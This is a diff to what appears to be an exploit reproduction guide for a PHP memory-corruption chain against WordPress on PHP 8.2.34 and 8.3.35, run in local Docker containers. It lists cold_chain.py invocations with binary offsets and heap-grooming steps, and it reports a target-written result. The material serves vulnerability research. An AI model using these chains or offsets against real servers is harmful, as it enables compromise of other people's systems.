@@ -148,24 +148,39 @@ python3 tools/chain_early.py --container <container> --port <PORT> \
 
 The control tree was WordPress `7.2-beta1-64694`; `/wp-content/index.php` is the 28-byte core silence file (md5 `67442c5615eba73d105c0715c6620850`).
 
-## 4. 8.2.34 / 8.3.35 attempt (negative result in this tree)
+## 4. 8.2.34 / 8.3.35 recovered-body rerun (target-written)
+
+The 2026-10-26 rerun used the recovered Oct-24 bodies and `cold_chain.py` (R1
+pool pinning), not the earlier `a1_early.bin`/`b1_early.bin` pair. Exact
+per-build commands, including body regeneration, are in
+`php-8.2.34/commands.txt` and `php-8.3.35/commands.txt`.
 
 ```bash
-bash tools/setup_build.sh 8.2.34 <PORT> <container> <RUNDIR>/run/8234
-python3 tools/chain_early.py --container <container> --port <PORT> \
-  --tag PR8234A --build 8.2.34 --zdtor 0x487650 --zif 0x39b8a0 --soff 0xED398 \
-  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
-  --outdir <RUNDIR>/run/8234/out --logdir <RUNDIR>/run/8234/logs
+docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
+  -v <RUNDIR>/www:/var/www/html \
+  -v <RUNDIR>/logs:/var/log/apache2 \
+  -v <RUNDIR>/conf/php.ini:/usr/local/etc/php/php.ini \
+  php:8.2.34-apache
+python3 <RUNDIR>/scripts/cold_chain.py --container <container> --port <PORT> \
+  --tag 8234b_r1 --zd-off 0x487650 --zif-off 0x39b8a0 --s-off 0xF9398 \
+  --steps "warmup:20,holders:149:640,ramp:15,a1,b1,a2,b2,marker" \
+  --logfile <RUNDIR>/out/run_8234b_r1.log
 
-bash tools/setup_build.sh 8.3.35 <PORT> <container> <RUNDIR>/run/8335
-python3 tools/chain_early.py --container <container> --port <PORT> \
-  --tag PR8335A --build 8.3.35 --zdtor 0x49ec50 --zif 0x3ac080 --soff 0xED398 \
-  --a1 <RUNDIR>/bodies/a1_early.bin --b1 <RUNDIR>/bodies/b1_early.bin --fillers 115 \
-  --outdir <RUNDIR>/run/8335/out --logdir <RUNDIR>/run/8335/logs
-
+docker run -d --name <container> -p 127.0.0.1:<PORT>:80 \
+  -v <RUNDIR>/www:/var/www/html \
+  -v <RUNDIR>/logs:/var/log/apache2 \
+  -v <RUNDIR>/conf/php.ini:/usr/local/etc/php/php.ini \
+  php:8.3.35-apache
+python3 <RUNDIR>/scripts/cold_chain.py --container <container> --port <PORT> \
+  --tag 8335b_r1 --zd-off 0x49EC50 --zif-off 0x3AC080 --s-off 0xF9398 \
+  --steps "warmup:20,holders:149:640,ramp:15,a1,b1,a2,b2,marker" \
+  --logfile <RUNDIR>/out/run_8335b_r1.log
 ```
 
-These two commands reproduce the **negative** records: A1 reaches only the parse-time OOM and B1 returns no pointers. `--soff 0xED398` is the driver default and was never reached; the `S` anchor for 8.2.34/8.3.35 has not been measured.
+The second run per build uses the same command with `_r2` in the tag and
+logfile. The earlier public rerun with the stock early A1 is preserved under
+each build's `evidence/` and is marked superseded; it is not the basis for the
+target-written rows.
 
 ## 5. Verification
 
